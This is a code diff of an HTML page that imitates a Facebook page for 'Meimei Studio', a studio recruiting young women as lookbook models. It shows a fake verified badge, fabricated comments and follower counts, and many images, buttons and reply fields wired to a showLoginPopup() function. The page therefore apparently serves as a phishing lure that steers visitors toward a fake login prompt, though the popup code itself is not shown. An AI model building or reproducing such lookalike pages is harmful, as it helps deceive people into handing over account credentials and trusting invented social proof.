-                            Vibe nữ tính, thanh lịch, thần thái cuốn hút.  
-                            Ảnh đẹp, sắc nét, đúng màu, gửi trong 3-5 ngày.  
-                            Giữ trang phục như mới.  
-                            💌 Ứng tuyển: Inbox ngay để nhận sản phẩm mẫu!
-                        </div>
-                        <span class="see-more" onclick="toggleSeeMore(this)">Xem thêm</span>
+                        <p> Mẫu nhà MeiMei nè xinh xỉu luôn nha mấy chế ơi , ib em làm một bộ nhé 😍 không tốn tiền mà còn được ảnh video làm kỉ niệm nha mấy bà ♥️ !</p>
                         <div class="image-gallery">
-                            <img src="https://imgur.com/GDGSiBJ.jpg" alt="Lookbook 1" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/kMfbbEG.jpg" alt="Lookbook 2" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/BEuyCv3.jpg" alt="Lookbook 3" onclick="showLoginPopup()">
+                            <img src="https://imgur.com/GDGSiBJ.jpg" alt="Lookbook 1">
+                            <img src="https://imgur.com/kMfbbEG.jpg" alt="Lookbook 2">
+                            <img src="https://imgur.com/kMfbbEG.jpg" alt="Lookbook 2">
                             <div class="more-images">
-                                <img src="https://imgur.com/BEuyCv3.jpg" alt="Lookbook 4" onclick="showLoginPopup()">
+                                <img src="https://imgur.com/BEuyCv3.jpg" alt="Lookbook 2">
                             </div>
                         </div>
                         <div class="like-info">
                             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like">
                             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/6UHmJipH8-J.png" alt="Haha">
                             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/EhyW6biK10i.png" alt="Love">
-                            <img src="https://i.imgur.com/GT3OXZP.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/7eRH4Fr.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/mj7UTEK.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/x7Z7Evf.jpg" class="avatar" alt="Avatar">
+                            <img src="https://i.imgur.com/YFwhhDb.jpg" class="avatar" alt="User Avatar">
+                            <img src="https://i.imgur.com/GT3OXZP.jpg" class="avatar" alt="User Avatar">
                             <span>Meimeistudio và 6.1k người khác</span>
                         </div>
                         <div class="actions">
@@ -298,23 +897,11 @@
                             </div>
                         </div>
                         <div class="comments">
-                            <div class="comment" onclick="toggleReply(this)">
-                                <img src="https://i.imgur.com/GT3OXZP.jpg" class="comment-avatar" alt="Avatar" data-tooltip="Hương Trà">
-                                <p data-tooltip="Hương Trà"><strong>Hương Trà:</strong> Rép ib em với chị ơi!</p>
-                                <div class="comment-reply">
-                                    <input type="text" placeholder="Viết câu trả lời..." onfocus="showLoginPopup()">
-                                </div>
-                            </div>
-                            <div class="comment" onclick="toggleReply(this)">
-                                <img src="https://i.imgur.com/7eRH4Fr.jpg" class="comment-avatar" alt="Avatar" data-tooltip="Thảo Linh">
-                                <p data-tooltip="Thảo Linh"><strong>Thảo Linh:</strong> Bên mình còn tuyển mẫu feedback không ạ?</p>
-                                <div class="comment-reply">
-                                    <input type="text" placeholder="Viết câu trả lời..." onfocus="showLoginPopup()">
-                                </div>
-                            </div>
-                            <span class="see-more-comments" onclick="showLoginPopup()">Xem thêm bình luận</span>
+                            <p><strong>Hương Trà:</strong> Rép ib em với chị ơi!</p>
+                            <p><strong>Thảo Linh:</strong> Bên mình còn tuyển mẫu feedback không ạ?</p>
                         </div>
                     </div>
+
                     <!-- Bài viết 3 -->
                     <div class="post">
                         <div class="post-header">
@@ -323,44 +910,23 @@
                                 <div class="name">Meimei Studio <span class="verified"></span></div>
                                 <div class="meta">
                                     <span class="time">12/01/2025</span>
-                                    <span class="globe-icon">
-                                        <svg viewBox="0 0 16 16" width="12" height="12" fill="#65676B">
-                                            <path d="M8 1a7 7 0 100 14A7 7 0 008 1zm-.5 12.5v-1.5c0-.3-.2-.5-.5-.5s-.5.2-.5.5v1.5c-2-.5-3.5-2-4-4h1.5c.3 0 .5-.2.5-.5s-.2-.5-.5-.5H2.2c.2-1 .6-2 1.3-2.8l1.1.8c.2.2.5.2.7 0s.2-.5 0-.7l-1-1C5.8 3.6 6.8 3.2 8 3.2c1.2 0 2.2.4 3 1l-1 .8c-.2.2-.2.5 0 .7s.5.2.7 0l1.1-.8c.7.8 1.1 1.8 1.3 2.8h-1.5c-.3 0-.5.2-.5.5s.2.5.5.5h1.5c-.5 2-2 3.5-4 4z"/>
-                                        </svg>
-                                    </span>
                                 </div>
                             </div>
                         </div>
                         <div class="post-content">Tìm ngôi sao chụp lookbook mới!</div>
-                        <div class="content-text">
-                            ✨ Meimei Studio Tìm Ngôi Sao Chụp Lookbook 📸
-
-                            Công việc:  
-                            Để làm sáng trang phục của shop, chụp 3-4 ảnh/bộ (tối đa 10 bộ).  
-                            Cơ hội đồng hành cùng một cửa hàng qua các bộ sưu tập.  
-                            Thù lao: 200k–500k theo chất lượng ảnh. Phí ship 2 chiều shop lo hết!  
-
-                            Yêu cầu:  
-                            Nữ tính, duyên dáng, biết cách lên hình.  
-                            Ảnh sáng, đúng màu, gửi trong 3-5 ngày.  
-                            Trả lại đồ sạch sẽ.  
-                            📩 Ứng tuyển: Inbox để xem mẫu sản phẩm và bắt đầu!
-                        </div>
-                        <span class="see-more" onclick="toggleSeeMore(this)">Xem thêm</span>
+                        <p> Mấy bà ơi nhà meimei cần mẫu quay LOOKBOOK có mấy mẫu siêu hót luôn nè 😘! Đảm bảo siêu mê bà nào đồng ý làm mẫu bên tui làm miễn phí trả case luôn cũng chịu nha , ib xem mẫu nhé mấy bà ♥️!</p>
                         <div class="image-gallery">
-                            <img src="https://imgur.com/MLMjl3Y.jpg" alt="Livestream 1" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/Smaexod.jpg" alt="Livestream 2" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/wgWVjG5.jpg" alt="Livestream 3" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/NZFXea4.jpg" alt="Livestream 4" onclick="showLoginPopup()">
+                            <img src="https://imgur.com/MLMjl3Y.jpg" alt="Livestream 1">
+                            <img src="https://imgur.com/Smaexod.jpg" alt="Livestream 2">
+                            <img src="https://imgur.com/wgWVjG5.jpg" alt="Livestream 3">
+                            <img src="https://imgur.com/NZFXea4.jpg" alt="Livestream 3">
                         </div>
                         <div class="like-info">
                             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like">
                             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/6UHmJipH8-J.png" alt="Haha">
                             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/EhyW6biK10i.png" alt="Love">
-                            <img src="https://i.imgur.com/mj7UTEK.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/x7Z7Evf.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/bpwB1Mw.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/nzhClNJ.jpg" class="avatar" alt="Avatar">
+                            <img src="https://i.imgur.com/GT3OXZP.jpg" class="avatar" alt="User Avatar">
+                            <img src="https://i.imgur.com/7eRH4Fr.jpg" class="avatar" alt="User Avatar">
                             <span>Meimeistudio và 7.2k người khác</span>
                         </div>
                         <div class="actions">
@@ -375,23 +941,11 @@
                             </div>
                         </div>
                         <div class="comments">
-                            <div class="comment" onclick="toggleReply(this)">
-                                <img src="https://i.imgur.com/mj7UTEK.jpg" class="comment-avatar" alt="Avatar" data-tooltip="Thu Hà">
-                                <p data-tooltip="Thu Hà"><strong>Thu Hà:</strong> Đã hợp tác với shop Meimei, mong được lần sau, tks shop nha!</p>
-                                <div class="comment-reply">
-                                    <input type="text" placeholder="Viết câu trả lời..." onfocus="showLoginPopup()">
-                                </div>
-                            </div>
-                            <div class="comment" onclick="toggleReply(this)">
-                                <img src="https://i.imgur.com/x7Z7Evf.jpg" class="comment-avatar" alt="Avatar" data-tooltip="Yến Nhi">
-                                <p data-tooltip="Yến Nhi"><strong>Yến Nhi:</strong> Ước được chụp ảnh bên shop Meimei 😍</p>
-                                <div class="comment-reply">
-                                    <input type="text" placeholder="Viết câu trả lời..." onfocus="showLoginPopup()">
-                                </div>
-                            </div>
-                            <span class="see-more-comments" onclick="showLoginPopup()">Xem thêm bình luận</span>
+                            <p><strong>Thu Hà:</strong> Đã hợp tác với shop Meimei, mong được lần sau, tks shop nha!</p>
+                            <p><strong>Yến Nhi:</strong> Ước được chụp ảnh bên shop Meimei 😍</p>
                         </div>
                     </div>
+
                     <!-- Bài viết 4 -->
                     <div class="post">
                         <div class="post-header">
@@ -400,44 +954,23 @@
                                 <div class="name">Meimei Studio <span class="verified"></span></div>
                                 <div class="meta">
                                     <span class="time">21/12/2024</span>
-                                    <span class="globe-icon">
-                                        <svg viewBox="0 0 16 16" width="12" height="12" fill="#65676B">
-                                            <path d="M8 1a7 7 0 100 14A7 7 0 008 1zm-.5 12.5v-1.5c0-.3-.2-.5-.5-.5s-.5.2-.5.5v1.5c-2-.5-3.5-2-4-4h1.5c.3 0 .5-.2.5-.5s-.2-.5-.5-.5H2.2c.2-1 .6-2 1.3-2.8l1.1.8c.2.2.5.2.7 0s.2-.5 0-.7l-1-1C5.8 3.6 6.8 3.2 8 3.2c1.2 0 2.2.4 3 1l-1 .8c-.2.2-.2.5 0 .7s.5.2.7 0l1.1-.8c.7.8 1.1 1.8 1.3 2.8h-1.5c-.3 0-.5.2-.5.5s.2.5.5.5h1.5c-.5 2-2 3.5-4 4z"/>
-                                        </svg>
-                                    </span>
                                 </div>
                             </div>
                         </div>
                         <div class="post-content">Kêu gọi mẫu ảnh sản phẩm mới!</div>
-                        <div class="content-text">
-                            ✨ Meimei Studio Kêu Gọi Mẫu Ảnh Sản Phẩm 📷
-
-                            Công việc:  
-                            Shop phong cách & chụp trang phục gửi (3-4 ảnh/bộ, tối đa 10 bộ).  
-                            Thích hợp thì cùng nhau làm việc lâu dài!  
-                            Thù lao: 200k–500k tùy ảnh. Shop chi trả phí vận chuyển.  
-
-                            Yêu cầu:  
-                            Vibe nhẹ nhàng, thanh lịch, tạo kiểu dáng tự nhiên.  
-                            Chất lượng, không lệch màu, gửi trong 3-5 ngày.  
-                            Giữ trang phục cẩn thận.  
-                            💬 Ứng tuyển: Nhắn tin để nhận sản phẩm ngay!
-                        </div>
-                        <span class="see-more" onclick="toggleSeeMore(this)">Xem thêm</span>
+                        <p> Bà nào thích mẫu concep nào hót ib tui làm một bộ nhé hứa làm miễn phí nè♥️ Nhiều mẫu hót mà đẹp quá bà nào muốn ib tui liền nha 😘 !</p>
                         <div class="image-gallery">
-                            <img src="https://imgur.com/7eRH4Fr.jpg" alt="Tuyển mẫu 1" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/mj7UTEK.jpg" alt="Tuyển mẫu 2" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/x7Z7Evf.jpg" alt="Tuyển mẫu 3" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/GT3OXZP.jpg" alt="Tuyển mẫu 4" onclick="showLoginPopup()">
+                            <img src="https://imgur.com/7eRH4Fr.jpg" alt="Tuyển mẫu 1">
+                            <img src="https://imgur.com/mj7UTEK.jpg" alt="Tuyển mẫu 2">
+                            <img src="https://imgur.com/x7Z7Evf.jpg" alt="Tuyển mẫu 3">
+                            <img src="https://imgur.com/GT3OXZP.jpg" alt="Tuyển mẫu 4">
                         </div>
                         <div class="like-info">
                             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like">
                             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/6UHmJipH8-J.png" alt="Haha">
                             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/EhyW6biK10i.png" alt="Love">
-                            <img src="https://i.imgur.com/bpwB1Mw.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/nzhClNJ.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/KjwTWnb.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/Qlja8xQ.jpg" class="avatar" alt="Avatar">
+                            <img src="https://i.imgur.com/7eRH4Fr.jpg" class="avatar" alt="User Avatar">
+                            <img src="https://i.imgur.com/mj7UTEK.jpg" class="avatar" alt="User Avatar">
                             <span>Meimeistudio và 7k người khác</span>
                         </div>
                         <div class="actions">
@@ -452,23 +985,11 @@
                             </div>
                         </div>
                         <div class="comments">
-                            <div class="comment" onclick="toggleReply(this)">
-                                <img src="https://i.imgur.com/bpwB1Mw.jpg" class="comment-avatar" alt="Avatar" data-tooltip="Linh Nguyễn">
-                                <p data-tooltip="Linh Nguyễn"><strong>Linh Nguyễn:</strong> Mẫu này xinh quá, đăng ký ở đâu vậy shop?</p>
-                                <div class="comment-reply">
-                                    <input type="text" placeholder="Viết câu trả lời..." onfocus="showLoginPopup()">
-                                </div>
-                            </div>
-                            <div class="comment" onclick="toggleReply(this)">
-                                <img src="https://i.imgur.com/nzhClNJ.jpg" class="comment-avatar" alt="Avatar" data-tooltip="Hà Anh">
-                                <p data-tooltip="Hà Anh"><strong>Hà Anh:</strong> Concept này đẹp thật, mình muốn thử!</p>
-                                <div class="comment-reply">
-                                    <input type="text" placeholder="Viết câu trả lời..." onfocus="showLoginPopup()">
-                                </div>
-                            </div>
-                            <span class="see-more-comments" onclick="showLoginPopup()">Xem thêm bình luận</span>
+                            <p><strong>Linh Nguyễn:</strong> Mẫu này xinh quá, đăng ký ở đâu vậy shop?</p>
+                            <p><strong>Hà Anh:</strong> Concept này đẹp thật, mình muốn thử!</p>
                         </div>
                     </div>
+
                     <!-- Bài viết 5 -->
                     <div class="post">
                         <div class="post-header">
@@ -477,35 +998,26 @@
                                 <div class="name">Meimei Studio <span class="verified"></span></div>
                                 <div class="meta">
                                     <span class="time">18/10/2024</span>
-                                    <span class="globe-icon">
-                                        <svg viewBox="0 0 16 16" width="12" height="12" fill="#65676B">
-                                            <path d="M8 1a7 7 0 100 14A7 7 0 008 1zm-.5 12.5v-1.5c0-.3-.2-.5-.5-.5s-.5.2-.5.5v1.5c-2-.5-3.5-2-4-4h1.5c.3 0 .5-.2.5-.5s-.2-.5-.5-.5H2.2c.2-1 .6-2 1.3-2.8l1.1.8c.2.2.5.2.7 0s.2-.5 0-.7l-1-1C5.8 3.6 6.8 3.2 8 3.2c1.2 0 2.2.4 3 1l-1 .8c-.2.2-.2.5 0 .7s.5.2.7 0l1.1-.8c.7.8 1.1 1.8 1.3 2.8h-1.5c-.3 0-.5.2-.5.5s.2.5.5.5h1.5c-.5 2-2 3.5-4 4z"/>
-                                        </svg>
-                                    </span>
                                 </div>
                             </div>
                         </div>
                         <div class="post-content">Cảm ơn feedback từ chị H.!</div>
-                        <div class="content-text">
-                            Cảm ơn chị H. đã gửi feedback, ai muốn đăng ký mẫu ảnh hay chụp lookbook ib mình nha!
-                        </div>
-                        <span class="see-more" onclick="toggleSeeMore(this)">Xem thêm</span>
+                        <p>Cảm ơn chị H. đã gửi feedback, ai muốn đăng ký mẫu ảnh hay chụp lookbook ib mình nha!</p>
                         <div class="image-gallery">
-                            <img src="https://imgur.com/PFw6ohI.jpg" alt="Feedback mẫu ảnh" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/JvsEaqS.jpg" alt="Feedback mẫu ảnh" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/3i4GTMx.jpg" alt="Feedback mẫu ảnh" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/qmAr0ky.jpg" alt="Feedback mẫu ảnh" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/wIzKHmz.jpg" alt="Feedback mẫu ảnh" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/Soh6BgS.jpg" alt="Feedback mẫu ảnh" onclick="showLoginPopup()">
+                            <img src="https://imgur.com/PFw6ohI.jpg" alt="Feedback mẫu ảnh">
+                            <img src="https://imgur.com/JvsEaqS.jpg" alt="Feedback mẫu ảnh">
+                            <img src="https://imgur.com/3i4GTMx.jpg" alt="Feedback mẫu ảnh">
+                            <img src="https://imgur.com/qmAr0ky.jpg" alt="Feedback mẫu ảnh">
+                            <div class="more-images">
+                                <img src="https://imgur.com/wIzKHmz.jpg" alt="Feedback mẫu ảnh">
+                            </div>
                         </div>
                         <div class="like-info">
                             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like">
                             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/6UHmJipH8-J.png" alt="Haha">
                             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/EhyW6biK10i.png" alt="Love">
-                            <img src="https://i.imgur.com/KjwTWnb.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/Qlja8xQ.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/oy1XxUp.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/YFwhhDb.jpg" class="avatar" alt="Avatar">
+                            <img src="https://i.imgur.com/mj7UTEK.jpg" class="avatar" alt="User Avatar">
+                            <img src="https://i.imgur.com/x7Z7Evf.jpg" class="avatar" alt="User Avatar">
                             <span>Meimeistudio và 8k người khác</span>
                         </div>
                         <div class="actions">
@@ -520,110 +1032,80 @@
                             </div>
                         </div>
                         <div class="comments">
-                            <div class="comment" onclick="toggleReply(this)">
-                                <img src="https://i.imgur.com/KjwTWnb.jpg" class="comment-avatar" alt="Avatar" data-tooltip="Ngọc Anh">
-                                <p data-tooltip="Ngọc Anh"><strong>Ngọc Anh:</strong> Shop này uy tín ở Hà Nội này, chụp ảnh cứ gọi là tuyệt vời nha!</p>
-                                <div class="comment-reply">
-                                    <input type="text" placeholder="Viết câu trả lời..." onfocus="showLoginPopup()">
-                                </div>
-                            </div>
-                            <div class="comment" onclick="toggleReply(this)">
-                                <img src="https://i.imgur.com/Qlja8xQ.jpg" class="comment-avatar" alt="Avatar" data-tooltip="Minh Thu">
-                                <p data-tooltip="Minh Thu"><strong>Minh Thu:</strong> Chụp ảnh đẹp thật, feedback chuẩn luôn 😍</p>
-                                <div class="comment-reply">
-                                    <input type="text" placeholder="Viết câu trả lời..." onfocus="showLoginPopup()">
-                                </div>
-                            </div>
-                            <span class="see-more-comments" onclick="showLoginPopup()">Xem thêm bình luận</span>
-                        </div>
-                    </div>
-                    <!-- Bài viết 6 -->
-                    <div class="post">
-                        <div class="post-header">
-                            <img src="https://i.imgur.com/qAdnBSo.jpg" alt="Profile Pic">
-                            <div class="info">
-                                <div class="name">Meimei Studio <span class="verified"></span></div>
-                                <div class="meta">
-                                    <span class="time">10/04/2025</span>
-                                    <span class="globe-icon">
-                                        <svg viewBox="0 0 16 16" width="12" height="12" fill="#65676B">
-                                            <path d="M8 1a7 7 0 100 14A7 7 0 008 1zm-.5 12.5v-1.5c0-.3-.2-.5-.5-.5s-.5.2-.5.5v1.5c-2-.5-3.5-2-4-4h1.5c.3 0 .5-.2.5-.5s-.2-.5-.5-.5H2.2c.2-1 .6-2 1.3-2.8l1.1.8c.2.2.5.2.7 0s.2-.5 0-.7l-1-1C5.8 3.6 6.8 3.2 8 3.2c1.2 0 2.2.4 3 1l-1 .8c-.2.2-.2.5 0 .7s.5.2.7 0l1.1-.8c.7.8 1.1 1.8 1.3 2.8h-1.5c-.3 0-.5.2-.5.5s.2.5.5.5h1.5c-.5 2-2 3.5-4 4z"/>
-                                        </svg>
-                                    </span>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="post-content">Tuyển mẫu ảnh mới cho concept độc đáo!</div>
-                        <div class="content-text">
-                            ✨ Meimei Studio Tuyển Mẫu Ảnh Mới 📷  
-                            Cơ hội tham gia chụp ảnh concept độc đáo!  
-                            📩 Inbox ngay để biết thêm chi tiết!
-                        </div>
-                        <span class="see-more" onclick="toggleSeeMore(this)">Xem thêm</span>
-                        <div class="image-gallery">
-                            <img src="https://imgur.com/bpwB1Mw.jpg" alt="Tuyển mẫu mới" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/nzhClNJ.jpg" alt="Tuyển mẫu mới" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/KjwTWnb.jpg" alt="Tuyển mẫu mới" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/Qlja8xQ.jpg" alt="Tuyển mẫu mới" onclick="showLoginPopup()">
-                        </div>
-                        <div class="like-info">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/6UHmJipH8-J.png" alt="Haha">
-                            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/EhyW6biK10i.png" alt="Love">
-                            <img src="https://i.imgur.com/x7Z7Evf.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/bpwB1Mw.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/nzhClNJ.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/KjwTWnb.jpg" class="avatar" alt="Avatar">
-                            <span>Meimeistudio và 5k người khác</span>
-                        </div>
-                        <div class="actions">
-                            <div class="action like" onclick="showLoginPopup()">
-                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like"> Thích <span>5k</span>
-                            </div>
-                            <div class="action comment" onclick="showLoginPopup()">
-                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yY/r/a2B8aH2zWrc.png" alt="Comment"> Bình luận <span>300</span>
-                            </div>
-                            <div class="action share" onclick="showLoginPopup()">
-                                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/0--2A9QseKL.png" alt="Share"> Chia sẻ <span>200</span>
-                            </div>
-                        </div>
-                        <div class="comments">
-                            <div class="comment" onclick="toggleReply(this)">
-                                <img src="https://i.imgur.com/nzhClNJ.jpg" class="comment-avatar" alt="Avatar" data-tooltip="Phương Anh">
-                                <p data-tooltip="Phương Anh"><strong>Phương Anh:</strong> Concept này đẹp quá, mình muốn tham gia!</p>
-                                <div class="comment-reply">
-                                    <input type="text" placeholder="Viết câu trả lời..." onfocus="showLoginPopup()">
-                                </div>
-                            </div>
-                            <div class="comment" onclick="toggleReply(this)">
-                                <img src="https://i.imgur.com/KjwTWnb.jpg" class="comment-avatar" alt="Avatar" data-tooltip="Khánh Linh">
-                                <p data-tooltip="Khánh Linh"><strong>Khánh Linh:</strong> Shop rep inbox mình với nhé!</p>
-                                <div class="comment-reply">
-                                    <input type="text" placeholder="Viết câu trả lời..." onfocus="showLoginPopup()">
-                                </div>
-                            </div>
-                            <span class="see-more-comments" onclick="showLoginPopup()">Xem thêm bình luận</span>
+                            <p><strong>Ngọc Anh:</strong> Shop này uy tín ở Hà Nội này, chụp ảnh cứ gọi là tuyệt vời nha!</p>
+                            <p><strong>Minh Thu:</strong> Chụp ảnh đẹp thật, feedback chuẩn luôn 😍</p>
                         </div>
                     </div>
                 </div>
 
-                <div id="about-tab" class="intro-section tab-content">
+                <div id="about-tab" class="intro-section about-section tab-content">
                     <p><strong>Giới thiệu</strong></p>
                     <div class="item">
-                        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/4r5pN3v2aN5.png" alt="Page">
+                        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/4r5pN3v2aN5.png" alt="Page" class="icon">
                         <span>Studio chụp ảnh</span>
                     </div>
                     <div class="item">
-                        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/5uH7TXzWENM.png" alt="Website">
-                        <span><a href="https://www.tiktok.com/@meimeimodel_vision" onclick="showLoginPopup()">tiktok.com/@meimeimodel_vision</a></span>
+                        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/5uH7TXzWENM.png" alt="Website" class="icon">
+                        <span><a href="https://www.tiktok.com/@meimeimodel_vision">tiktok.com/@meimeimodel_vision</a></span>
                     </div>
                     <div class="item">
-                        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yW/r/6zYk4cJJeL8.png" alt="Email">
+                        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yW/r/6zYk4cJJeL8.png" alt="Email" class="icon">
                         <span>contact@meimeistudio.vn</span>
                     </div>
                     <div class="item">
-                        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/5hM-k1AN4eS.png" alt="Location">
+                        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/5hM-k1AN4eS.png" alt="Location" class="icon">
                         <span>424 Nguyễn Trãi, Quận 1, TP. Hồ Chí Minh</span>
+                    </div>
+                </div>
+
+                <div id="photos-tab" class="photos-section tab-content">
+                    <p><strong>Ảnh</strong></p>
+                    <div class="album">
+                        <img src="https://imgur.com/oy1XxUp.jpg" alt="Ảnh 1" onclick="showLoginPopup()">
+                        <img src="https://imgur.com/YFwhhDb.jpg" alt="Ảnh 2" onclick="showLoginPopup()">
+                        <img src="https://imgur.com/GT3OXZP.jpg" alt="Ảnh 3" onclick="showLoginPopup()">
+                        <img src="https://imgur.com/GT3OXZP.jpg" alt="Ảnh 4" onclick="showLoginPopup()">
+                        <img src="https://imgur.com/7eRH4Fr.jpg" alt="Ảnh 5" onclick="showLoginPopup()">
+                        <img src="https://imgur.com/mj7UTEK.jpg" alt="Ảnh 6" onclick="showLoginPopup()">
+                        <img src="https://imgur.com/7eRH4Fr.jpg" alt="Ảnh 7" onclick="showLoginPopup()">
+                    </div>
+                </div>
+
+                <div id="videos-tab" class="videos-section tab-content">
+                    <p><strong>Video</strong></p>
+                    <div class="video-list">
+                        <div class="video-item" onclick="showLoginPopup()">
+                            <img src="https://imgur.com/Fw9t5Ih.jpg" alt="Thumbnail" class="thumbnail">
+                            <div class="play-icon"></div>
+                            <div class="video-info">
+                                <div class="title">Lookbook Xuân 2025 - Meimei Studio</div>
+                                <div class="meta">21/03/2025 • 2:30</div>
+                            </div>
+                        </div>
+                        <div class="video-item" onclick="showLoginPopup()">
+                            <img src="https://imgur.com/bASHqqu.jpg" alt="Thumbnail" class="thumbnail">
+                            <div class="play-icon"></div>
+                            <div class="video-info">
+                                <div class="title">Lookbook Hè 2025 - Meimei Studio</div>
+                                <div class="meta">28/02/2025 • 3:15</div>
+                            </div>
+                        </div>
+                        <div class="video-item" onclick="showLoginPopup()">
+                            <img src="https://imgur.com/zCaD2w9.jpg" alt="Thumbnail" class="thumbnail">
+                            <div class="play-icon"></div>
+                            <div class="video-info">
+                                <div class="title">Livestream Bán Hàng 01/2025</div>
+                                <div class="meta">12/01/2025 • 45:10</div>
+                            </div>
+                        </div>
+                        <div class="video-item" onclick="showLoginPopup()">
+                            <img src="https://imgur.com/6WGS0H9.jpg" alt="Thumbnail" class="thumbnail">
+                            <div class="play-icon"></div>
+                            <div class="video-info">
+                                <div class="title">Livestream Giới Thiệu Sản Phẩm Mới</div>
+                                <div class="meta">21/12/2024 • 30:00</div>
+                            </div>
+                        </div>
                     </div>
                 </div>
 
@@ -633,38 +1115,18 @@
                         <div class="video-item" onclick="showLoginPopup()">
                             <img src="https://imgur.com/bASHqqu.jpg" alt="Thumbnail" class="thumbnail">
                             <div class="play-icon"></div>
-                            <div class="video-duration">0:15</div>
-                            <div class="video-info">
-                                <div class="title">Reel 1 - Meimei Studio</div>
-                                <div class="meta">10/04/2025 • 0:15</div>
-                            </div>
                         </div>
                         <div class="video-item" onclick="showLoginPopup()">
                             <img src="https://imgur.com/Fw9t5Ih.jpg" alt="Thumbnail" class="thumbnail">
                             <div class="play-icon"></div>
-                            <div class="video-duration">0:20</div>
-                            <div class="video-info">
-                                <div class="title">Reel 2 - Meimei Studio</div>
-                                <div class="meta">10/04/2025 • 0:20</div>
-                            </div>
                         </div>
                         <div class="video-item" onclick="showLoginPopup()">
                             <img src="https://imgur.com/zCaD2w9.jpg" alt="Thumbnail" class="thumbnail">
                             <div class="play-icon"></div>
-                            <div class="video-duration">0:25</div>
-                            <div class="video-info">
-                                <div class="title">Reel 3 - Meimei Studio</div>
-                                <div class="meta">10/04/2025 • 0:25</div>
-                            </div>
                         </div>
                         <div class="video-item" onclick="showLoginPopup()">
                             <img src="https://imgur.com/6WGS0H9.jpg" alt="Thumbnail" class="thumbnail">
                             <div class="play-icon"></div>
-                            <div class="video-duration">0:30</div>
-                            <div class="video-info">
-                                <div class="title">Reel 4 - Meimei Studio</div>
-                                <div class="meta">10/04/2025 • 0:30</div>
-                            </div>
                         </div>
                     </div>
                 </div>
@@ -675,22 +1137,13 @@
                     <p>648k người theo dõi</p>
                     <div class="like-item">
                         <img src="https://i.imgur.com/oy1XxUp.jpg" class="avatar" alt="Avatar">
-                        <span><a href="#" onclick="showLoginPopup()">Lan Anh</a></span>
+                        <span><a href="#">Lan Anh</a></span>
                     </div>
                     <div class="like-item">
                         <img src="https://i.imgur.com/YFwhhDb.jpg" class="avatar" alt="Avatar">
-                        <span><a href="#" onclick="showLoginPopup()">Ngọc Mai</a></span>
+                        <span><a href="#">Ngọc Mai</a></span>
                     </div>
-                    <div class="like-others">
-                        <div class="avatar-stack">
-                            <img src="https://i.imgur.com/GT3OXZP.jpg" class="avatar" alt="Avatar" data-tooltip="Minh Anh">
-                            <img src="https://i.imgur.com/7eRH4Fr.jpg" class="avatar" alt="Avatar" data-tooltip="Thu Hà">
-                            <img src="https://i.imgur.com/mj7UTEK.jpg" class="avatar" alt="Avatar" data-tooltip="Yến Nhi">
-                            <img src="https://i.imgur.com/x7Z7Evf.jpg" class="avatar" alt="Avatar" data-tooltip="Linh Chi">
